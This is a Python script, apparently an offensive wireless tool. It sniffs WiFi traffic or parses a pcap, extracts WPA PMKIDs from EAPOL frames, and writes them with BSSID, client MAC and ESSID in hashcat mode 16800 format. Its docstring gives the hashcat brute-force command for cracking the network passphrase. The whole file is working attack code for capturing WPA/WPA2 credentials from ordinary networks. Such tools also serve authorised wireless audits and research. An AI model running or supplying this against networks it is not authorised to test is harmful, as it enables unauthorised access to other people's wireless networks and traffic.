#!/usr/bin/env python
"""
./hashcat64.bin -m 16800 hashes.file -a 3 -w 3 <psk>

Adjust under __main__ accordingly prior to launch
"""
import argparse
import binascii
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import packetEssentials as PE
import os
import sys

def pmkRip(packet):
    """Attempt to rip the PMKID"""
    pmkid = PE.pt.byteRip(packet[Raw].load,
                          order = 'last',
                          qty = 16,
                          compress = True)
    if pmkid[-1] != 0:
        return pmkid
    else:
        return False


def packetHandler():
    """Packet Handler"""
    def snarf(packet):
        ## BEACONS
        if packet.haslayer(Dot11Beacon):
            # print('x')
            ## ESSID MAC: ESSID
            essidDict.update({packet[Dot11].addr2: packet[Dot11Elt].info})

        ## EAPOLs
        elif packet.haslayer(EAPOL):

            ## AES == 89, TKIP == 8a
            if PE.pt.byteRip(packet[Raw], qty = 3)[6:] == '89' or\
            PE.pt.byteRip(packet[Raw], qty = 3)[6:].lower() == '8a':

                ## Assume we've already seen the beacon, ignore chicken/egg scenario
                pmkID = pmkRip(packet)
                if pmkID is not False:

                    ## ESSID MAC: packet
                    pmkDict.update({packet[Dot11].addr2: packet})

                    ## Set PMKID
                    ourHash = pmkID + '*'

                    ## BSSID
                    ourHash += packet[Dot11].addr2.replace(':', '') + '*'

                    ## Tgt MAC
                    ourHash += packet[Dot11].addr1.replace(':', '') + '*'

                    ## ESSID
                    try:
                        ourHash += str(binascii.hexlify(essidDict.get(packet[Dot11].addr2))).replace("b'", '').replace("'", '')  ## Dirty workaround to make this work with Python2x and 3x.
                        print (ourHash + ' -- ' + essidDict.get(packet[Dot11].addr2).decode() + ' -- ' + packet[Dot11].addr2 + '\n')
                        with open('hashes.file', 'a') as oFile:
                            oFile.write(ourHash + '\n')
                    except Exception as e:
                        print('\n\n')
                        print(e)
                        print ('Error on line {}'.format(sys.exc_info()[-1].tb_lineno))
    return snarf


## Prep
essidDict = {}
pmkDict = {}
xList = []
count = 1
qty = 0

## FS cleanup
try:
    os.remove('hashes.file')
except:
    pass


def main(args):
    pHandler = packetHandler()

    ## Live sniffing
    if args.i is not None:
        pkts = sniff(iface = args.i, prn = pHandler)

    ## Pcap parsing
    else:
        pkts = PcapReader(args.f)
        for p in pkts:
            pHandler(p)


if __name__ == '__main__':
    ## ARGUMENT PARSING
    parser = argparse.ArgumentParser(description = 'frameTracer')
    group = parser.add_mutually_exclusive_group(required = True)

    group.add_argument('-f', metavar = '<capture file>', help = 'PCAP to parse')
    group.add_argument('-i', metavar = '<interface>', help = 'Interface to sniff on')
    parser.add_argument('-v', help = 'verbose', action = 'store_true')
    args = parser.parse_args()
    main(args)
